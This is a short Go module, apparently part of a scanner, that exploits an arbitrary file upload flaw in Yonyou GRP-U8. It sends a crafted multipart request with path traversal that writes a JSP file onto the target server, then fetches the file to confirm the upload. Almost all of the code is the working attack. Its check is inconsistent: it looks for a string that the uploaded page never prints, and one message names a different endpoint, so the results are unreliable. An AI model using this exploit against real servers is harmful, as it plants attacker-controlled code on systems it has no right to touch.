package GRP_U8_UploadFileData

import (
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"strings"
	"time"
)

var (
	client = req.C().EnableForceHTTP1().EnableDumpEachRequest().SetTimeout(5 * time.Second)
	UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
)

func Run(url string) {
	url1 := url + "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg"
	data := "--ec126a48c5b7676dce1b676f5251358f\nContent-Disposition: form-data; \n\n<% out.println(\"3135168535\");%>\n--ec126a48c5b7676dce1b676f5251358f--"
	_, err := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent":   UA,
			"Content-Type": "multipart/form-data; boundary=ec126a48c5b7676dce1b676f5251358f",
		}).SetBody(data).Post(url1)
	if err != nil {
		color.Red.Println("[-] 用友 GRP-U8 U8AppProxy 任意文件上传漏洞不存在")
		return
	}
	resp1, err1 := client.R().
		SetHeaders(map[string]string{ // Set multiple headers at once
			"User-Agent": UA,
		}).Get(url + "/R9iPortal/94156577.jsp")
	if err1 != nil {
		color.Red.Println("[-] 用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在")
		return
	}
	if strings.Contains(resp1.String(), "yongyouu8") {
		color.Green.Println("[+] 用友 GRP-U8 UploadFileData 任意文件上传漏洞存在")
		return
	}
	color.Red.Println("[-] 用友 GRP-U8 UploadFileData 任意文件上传漏洞不存在")
}
